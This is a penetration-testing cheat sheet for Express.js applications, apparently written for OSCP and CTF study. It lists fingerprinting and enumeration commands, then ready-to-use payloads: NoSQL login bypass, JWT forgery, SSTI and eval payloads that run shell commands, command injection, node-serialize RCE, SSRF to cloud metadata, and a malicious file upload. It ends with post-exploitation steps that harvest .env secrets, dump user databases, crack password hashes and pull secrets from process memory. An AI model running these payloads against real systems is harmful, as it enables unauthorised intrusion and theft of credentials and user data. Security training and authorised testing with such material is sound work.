# Express.js

> Node.js Express framework reference for penetration testing. Covers detection,
> enumeration, known CVEs, exploitation patterns, misconfigurations, and
> post-exploitation.

---

## Table of Contents

- [1. Detection](#1-detection)
- [2. Enumeration](#2-enumeration)
- [3. Known CVEs](#3-known-cves)
- [4. Exploitation Patterns](#4-exploitation-patterns)
- [5. Misconfigurations](#5-misconfigurations)
- [6. Post-Exploitation](#6-post-exploitation)
- [7. OSCP Notes](#7-oscp-notes)
- [8. References](#8-references)

---

## 1. Detection

### Response headers

Express itself does not set distinctive headers, but sets some that hint:

```bash
curl -sI http://<TARGET>:3000/ | grep -iE '^(server|x-powered-by|set-cookie|etag)'
```

Expected output:

```text
X-Powered-By: Express
ETag: W/"1a-abcdefgh"
Set-Cookie: connect.sid=s%3Aabc...; Path=/; HttpOnly
```

Two strong fingerprints:
- `X-Powered-By: Express` (unless explicitly disabled)
- `ETag: W/"..."` (weak ETag from Express default)
- `connect.sid` cookie (Express session default)

### Default error pages

Express default error page (in dev with `NODE_ENV != production`):

```html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Cannot GET /nonexistent<br> &nbsp; &nbsp;at ...</pre>
</body>
</html>
```

Leaks full stack trace with file paths and line numbers.
In production (`NODE_ENV=production`), returns generic `Internal Server Error`.

Express default 404 (no custom handler):

```text
Cannot GET /nonexistent
```

The `Cannot GET /path` message is the strongest Express indicator.

### Default port

Express dev port: `3000`. Production: often behind nginx on 80/443.

### Headers specific to middleware

- `X-Powered-By: Express` (removed by `app.disable('x-powered-by')`)
- `Set-Cookie: connect.sid=...` (default session cookie)
- `Vary: Accept-Encoding` (compression middleware)
- `X-RateLimit-*` (express-rate-limit)

### nmap / whatweb

```bash
nmap -sV -p 80,443,3000,8000,8080 --script http-headers,http-title <TARGET>
whatweb -a 3 http://<TARGET>:3000/
```

---

## 2. Enumeration

### Standard Express paths

```bash
for p in / /api /api/v1 /api/users /api/auth /login /logout /register \
         /admin /dashboard /health /healthz /status /metrics /debug \
         /package.json /app.js /server.js /index.js /.env; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:3000$p")
  echo "$code  $p"
done
```

### Node.js / npm metadata leak

```bash
curl -s http://<TARGET>:3000/package.json
curl -s http://<TARGET>:3000/package-lock.json
```

`package-lock.json` reveals exact dependency versions -> CVE mapping.

### Directory listing (serve-static)

If `serve-index` is used:

```bash
curl -s http://<TARGET>:3000/public/ | grep -i 'index of'
```

### Source maps

If frontend uses webpack, `.js.map` files may leak source:

```bash
for f in $(curl -s http://<TARGET>:3000/ | grep -oE '/static/[^"]+\.js'); do
  curl -s "http://<TARGET>:3000$f.map" -o /tmp/$(basename $f).map
done
```

Decompile with `source-map-explorer` or manually read the `sourcesContent` field.

### Express route discovery

Express does not expose a route list by default. Use:

1. Static analysis of JS files.
2. Brute force.
3. Error messages (400 with "CastError" hints at MongoDB).

```bash
feroxbuster -u http://<TARGET>:3000/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x json,js,html
```

### Common API patterns

REST APIs:

```bash
for ep in /api/users /api/user/1 /api/admin /api/auth/login /api/products /api/orders; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://<TARGET>:3000$ep")
  echo "$code  $ep"
done
```

### JSON body test

Express APIs typically respond to JSON:

```bash
curl -s -X POST http://<TARGET>:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

### Static analysis of JS bundles

```bash
curl -s http://<TARGET>:3000/static/js/main.js | grep -oE '"/(api|admin|internal)[^"]*"'
curl -s http://<TARGET>:3000/main.js | grep -oE "'/(api|admin)[^']*'"
```

Regex for common API paths:

```bash
curl -s http://<TARGET>:3000/static/js/main.js | grep -oE '(https?://[^"]+|/[a-zA-Z0-9_/]+)' | sort -u
```

### Socket.IO

If Socket.IO is used:

```bash
curl -s http://<TARGET>:3000/socket.io/?EIO=4&transport=polling
```

Response contains `sid` + upgrade hint.

---

## 3. Known CVEs

### CVE-2024-29041 - Express open redirect

`res.location()` / `res.redirect()` does not properly encode URLs starting
with `//` -> open redirect.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-29041
Affected: Express 4.x < 4.19.2, 5.x < 5.0.0-beta.3.

PoC:

```bash
curl -sI "http://<TARGET>:3000/redirect?url=//evil.com"
# If Location: //evil.com -> vulnerable
```

### CVE-2022-24999 - qs prototype pollution

Transitive via `qs` < 6.10.3. When Express uses `qs` for query parsing with
`allowPrototypes: true` (rare), prototype pollution is possible.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-24999
Affected: qs < 6.10.3 (Express < 4.17.3).

PoC:

```bash
curl "http://<TARGET>:3000/api/search?__proto__[polluted]=yes"
curl "http://<TARGET>:3000/api/search?constructor[prototype][polluted]=yes"
```

### CVE-2024-43796 - XSS in `res.redirect`

Improper encoding in `res.redirect` allows XSS via crafted URL.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-43796
Affected: Express < 4.20.0.

### Body-parser DoS (CVE-2024-45590)

`body-parser` < 1.20.3 allows DoS via crafted URL-encoded body.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-45590
Affected: body-parser < 1.20.3.

### CVE-2024-47764 - cookie package prototype pollution

`cookie` < 0.7.0 has prototype pollution in `cookie.parse`. Transitive.

NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-47764
Affected: cookie < 0.7.0.

### Version -> CVE quick table

| Version | Type | CVE |
|---------|------|-----|
| 4.x < 4.19.2 | Open redirect | CVE-2024-29041 |
| 4.x < 4.20.0 | XSS in redirect | CVE-2024-43796 |
| qs < 6.10.3 | Prototype pollution | CVE-2022-24999 |
| body-parser < 1.20.3 | DoS | CVE-2024-45590 |

Express itself is small; most vulnerabilities live in:
- Middleware versions (qs, body-parser, cookie, multer)
- Application code (SSTI, SSRF, NoSQL injection, RCE via eval)
- Transitive deps (lodash, ejs, pug, handlebars, axios, node-fetch)

---

## 4. Exploitation Patterns

### NoSQL injection (MongoDB)

Most common Express + MongoDB vulnerability:

```bash
# Login bypass
curl -s -X POST http://<TARGET>:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":null}}'

# With $regex
curl -s -X POST http://<TARGET>:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}'

# $where (JS injection if enabled)
curl -s -X POST http://<TARGET>:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$where":"sleep(5000)"}}'
```

Expected output (login bypass):

```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","user":{"id":1,"role":"admin"}}
```

Extract data via `$regex` boolean:

```bash
# Boolean-based: check if password starts with 'a'
curl -s -X POST http://<TARGET>:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$regex":"^a"}}' | jq .
```

### JWT attacks

Express APIs typically use JWT for auth. Common attacks:

**1. Algorithm confusion (none):**

```bash
# Change alg to "none" and strip signature
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'user_id':1,'role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{header}.{payload}.')
"
```

**2. Weak HMAC secret:**

```bash
# Crack with hashcat
hashcat -m 16500 jwt.txt rockyou.txt
# Or use jwt_tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

**3. RS256 -> HS256 confusion:**

```bash
# Get public key from /jwks.json or /.well-known/jwks.json
curl -s http://<TARGET>:3000/.well-known/jwks.json

# Sign with the public key as HMAC secret
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

**4. kid injection (path traversal / SQLi / command injection):**

```bash
# Path traversal to /dev/null
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../../../../../dev/null" -S hs256 -p ""

# SQLi in kid
python3 jwt_tool.py <JWT> -I -hc kid -hv "x' UNION SELECT 'secret'--" -S hs256 -p "secret"
```

### Server-Side Template Injection (SSTI)

If user input reaches a template engine (EJS, Pug, Handlebars, Nunjucks):

**EJS:**

```bash
curl "http://<TARGET>:3000/page?name=<%25= 7*7 %25>"
curl "http://<TARGET>:3000/page?name=<%25= global.process.mainModule.require('child_process').execSync('id') %25>"
```

**Pug:**

```bash
curl "http://<TARGET>:3000/page?name=#{7*7}"
curl "http://<TARGET>:3000/page?name=#{global.process.mainModule.require('child_process').execSync('id')}"
```

**Handlebars:**

```bash
curl "http://<TARGET>:3000/page?name={{7*7}}"
# Requires a helper registration for full RCE
```

See SSTI.md for full payloads.

### Prototype pollution -> RCE

Chain via `lodash.merge` / `lodash.set` / `qs`:

```bash
# Pollution via JSON body
curl -X POST http://<TARGET>:3000/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ"}}'
```

# Pollution via query string
curl "http://<TARGET>:3000/api/merge?__proto__[polluted]=yes"
```

If the app later calls `child_process.spawn` with `shell: true` on an object
with polluted properties -> RCE.

See Prototype Pollution in the Technologies folder.

### Path traversal in static serving

Express `express.static` is safe by default, but custom `sendFile` handling
may be vulnerable:

```bash
curl "http://<TARGET>:3000/download?file=../../../../etc/passwd"
curl "http://<TARGET>:3000/static/..%2f..%2f..%2fetc%2fpasswd"
```

### SSRF via axios / node-fetch / request

If the app fetches user URLs:

```bash
curl "http://<TARGET>:3000/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://<TARGET>:3000/fetch?url=http://127.0.0.1:3000/admin/"
curl "http://<TARGET>:3000/fetch?url=file:///etc/passwd"
curl "http://<TARGET>:3000/fetch?url=gopher://127.0.0.1:6379/_INFO"
```

See SSRF.md for chains.

### Deserialization via `node-serialize`

If the app uses `node-serialize` (rare but known vulnerable):

```bash
curl -X POST http://<TARGET>:3000/api/data \
  -H "Content-Type: application/json" \
  -d '{"rce":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"id\",function(e,o){console.log(o)});}()"}'
```

### Command injection via `child_process.exec`

If user input reaches `exec()` (not `execFile`):

```bash
curl "http://<TARGET>:3000/ping?host=127.0.0.1;id"
curl "http://<TARGET>:3000/ping?host=127.0.0.1&id"
curl "http://<TARGET>:3000/ping?host=$(id)"
curl "http://<TARGET>:3000/ping?host=\`id\`"
```

### `eval` / `new Function` injection

If user input reaches `eval`:

```bash
curl "http://<TARGET>:3000/calc?expr=process.mainModule.require('child_process').execSync('id').toString()"
```

### Multer path traversal (file upload)

`multer` < 2.x has issues with filename handling:

```bash
curl -F "file=@shell.js;filename=../../../../app/public/shell.js" http://<TARGET>:3000/upload
curl http://<TARGET>:3000/shell.js
```

NVD: https://nvd.nist.gov/vuln/detail/CVE-2022-24434 (multer DoS)
NVD: https://nvd.nist.gov/vuln/detail/CVE-2024-21538 (multer RCE via filename)

### ReDoS in regex

User-controlled regexes in Express routes:

```bash
# Send payload causing catastrophic backtracking
curl "http://<TARGET>:3000/search?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaX"
```

---

## 5. Misconfigurations

### `X-Powered-By: Express` exposed

```bash
curl -sI http://<TARGET>:3000/ | grep -i x-powered-by
```

Fix: `app.disable('x-powered-by')` or helmet middleware.

### NODE_ENV=development in production

```bash
# Trigger an error -> get full stack trace
curl "http://<TARGET>:3000/api/users/'"
```

Full stack trace with file paths leaks project structure.

### `.env` exposed

```bash
curl -s http://<TARGET>:3000/.env
```

Expected output:

```text
DB_URI=mongodb://user:pass@localhost:27017/app
JWT_SECRET=supersecret123
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=...
STRIPE_SECRET_KEY=sk_live_...
```

### `package.json` / `package-lock.json` exposed

```bash
curl -s http://<TARGET>:3000/package.json | jq .
curl -s http://<TARGET>:3000/package-lock.json | jq .packages | head -50
```

Full dependency tree -> CVE mapping.

### CORS misconfig

```bash
curl -sI -H "Origin: https://evil.com" http://<TARGET>:3000/api/ | grep -i 'access-control'
```

If `Access-Control-Allow-Origin: https://evil.com` AND `Access-Control-Allow-Credentials: true` -> session theft.

### Session cookie flags

```bash
curl -sI http://<TARGET>:3000/ | grep -i 'set-cookie.*connect.sid'
```

Missing `Secure` / `SameSite=Strict` -> CSRF / hijack.

### No rate limiting on auth

```bash
for i in $(seq 1 100); do
  curl -s -X POST http://<TARGET>:3000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"pass'$i'"}' &
done
wait
```

If no 429 responses -> brute-forceable.

### Directory listing

```bash
curl -s http://<TARGET>:3000/public/ | grep -i 'index of'
```

Requires `serve-index`. Common in dev setups.

### Stack traces in production

```bash
curl "http://<TARGET>:3000/api/%00" | grep -iE 'at .*\.js:[0-9]+'
```

### `unsafe-inline` in CSP

```bash
curl -sI http://<TARGET>:3000/ | grep -i 'content-security-policy'
```

`script-src 'unsafe-inline'` -> XSS exploitable.

### Static files serving source

```bash
curl -s http://<TARGET>:3000/server.js
curl -s http://<TARGET>:3000/app.js
curl -s http://<TARGET>:3000/index.js
```

If `express.static` is misconfigured to serve project root -> source leak.

### Error verbosity per route

Some routes return detailed errors (`TypeError`, `CastError`):

```bash
curl "http://<TARGET>:3000/api/users/abc" | jq .error
```

`CastError: Cast to ObjectId failed for value "abc"` -> MongoDB + Express.

---

## 6. Post-Exploitation

### Config file locations

| Layout | Path |
|--------|------|
| Standard | `<app>/.env`, `<app>/config/`, `<app>/config.js` |
| PM2 | `~/.pm2/dump.pm2`, `/etc/pm2/` |
| Systemd | `/etc/systemd/system/myapp.service` |
| Docker | `/app/.env`, `/usr/src/app/.env` |
| Foreman/Heroku | `.env` in project root |

### What to look for

```bash
find / -name '.env' -not -path '*/node_modules/*' 2>/dev/null
cat /app/.env
cat /app/config/default.json
cat /app/config/production.json
systemctl show myapp --property=Environment
```

Key items in `.env`:

- `JWT_SECRET` -> forge JWTs
- `DB_URI` / `MONGODB_URI` -> DB access (often Mongo, sometimes MySQL/Postgres)
- `REDIS_URL` -> Redis (often no auth)
- `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` -> cloud pivot
- `STRIPE_SECRET_KEY` -> payments
- `SENDGRID_API_KEY` / `MAILGUN_API_KEY` -> email
- `SESSION_SECRET` -> forge session cookies
- `NODE_ENV=production` (should be; if not -> stack traces)

### Database access

From `DB_URI` / `MONGODB_URI`:

```bash
# MongoDB
mongosh "$MONGODB_URI"
show dbs
use app
db.users.find().pretty()
db.users.findOne({role: "admin"})

# PostgreSQL
psql "$DATABASE_URL"

# MySQL
mysql -u <user> -p<pass> -h <host> <db>
```

Users collection:

```javascript
db.users.find({}, {username: 1, password: 1, role: 1, token: 1})
```

Passwords stored as bcrypt (`$2a$` / `$2b$`):

```bash
hashcat -m 3200 hashes.txt rockyou.txt
```

Or plaintext (bad practice, but common in CTFs).

### Session store

Express sessions in Redis:

```bash
redis-cli -u "$REDIS_URL"
> keys sess:*
> get sess:<id>
```

In MongoDB (`connect-mongo`):

```javascript
db.sessions.find()
```

In memory (default) -> restart loses sessions, but the process memory contains
all active sessions.

### JWT verification bypass at source

If JWT verified with `jsonwebtoken` < 9.0.0 and using `algorithms` incorrectly:

```javascript
// Vulnerable:
jwt.verify(token, secret)  // accepts alg from token header

// Secure:
jwt.verify(token, secret, { algorithms: ['HS256'] })
```

Check `package.json` for `jsonwebtoken` version.

### Source code access

If you have shell:

```bash
cat /app/server.js
cat /app/routes/*.js
cat /app/controllers/*.js
cat /app/middleware/*.js
```

Look for:
- Hardcoded secrets (in source, not env)
- Debug endpoints (`/debug`, `/admin/dump`)
- `eval` usage
- `child_process.exec` with user input

### Log files

```bash
ls -la /var/log/node/ ~/.pm2/logs/ 2>/dev/null
tail -n 200 ~/.pm2/logs/app-out.log
tail -n 200 ~/.pm2/logs/app-error.log
```

Node logs include:
- Request URLs (with query params, sometimes tokens)
- Error stack traces
- `console.log()` of user input (dev leftovers)

### PM2 process dump

```bash
cat ~/.pm2/dump.pm2
```

Contains process env, script paths, working dirs.

### Node inspector

If `node --inspect` is running (port 9229), it exposes a Chrome DevTools
protocol endpoint -> RCE:

```bash
# Check for open port
nmap -p 9229 <TARGET>

# Access DevTools
curl http://<TARGET>:9229/json
# Connect via chrome://inspect or devtools-protocol
```

Attach with `ndb` / `chrome://inspect` -> evaluate arbitrary JS.

### Redis via node

If `REDIS_URL` has no password and app uses Redis for queues:

```bash
redis-cli -h <host> -p 6379
> keys bull:*
> lrange bull:queue:wait 0 -1
```

Bull queue payloads may contain job data with credentials.

### Recovered secrets in memory

With `gcore` / `gdb` on the Node process (root required):

```bash
gcore $(pgrep -f 'node' | head -1)
strings core.* | grep -iE 'JWT_SECRET|mongodb://|password' | sort -u
```

Node holds decrypted secrets in memory.

---

## 7. OSCP Notes

> [!IMPORTANT]
> OSCP report: screenshot the `X-Powered-By: Express` header OR the `Cannot GET /path` error page - either identifies Express.

> [!IMPORTANT]
> OSCP report: for NoSQL injection login bypass, screenshot the JSON payload AND the successful response (JWT / user object).

> [!IMPORTANT]
> OSCP report: for JWT forgery, screenshot the original token, the modified payload, and the successful admin request.

---

## 8. References

- Express official docs - https://expressjs.com/
- NVD search - https://nvd.nist.gov/vuln/search/results?query=express
- CVE-2024-29041 writeup - https://github.com/expressjs/express/security/advisories/GHSA-rv95-896h-c2vc
- JWT attacks - https://portswigger.net/web-security/jwt
- jwt_tool - https://github.com/ticarpi/jwt_tool
- NoSQL injection - https://book.hacktricks.xyz/pentesting-web/nosql-injection
- Prototype pollution - https://github.com/KindredGroup/prototype-pollution
- HackTricks - Express - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express

---

*Reference for authorized penetration testing, CTF, and OSCP exam preparation only.*
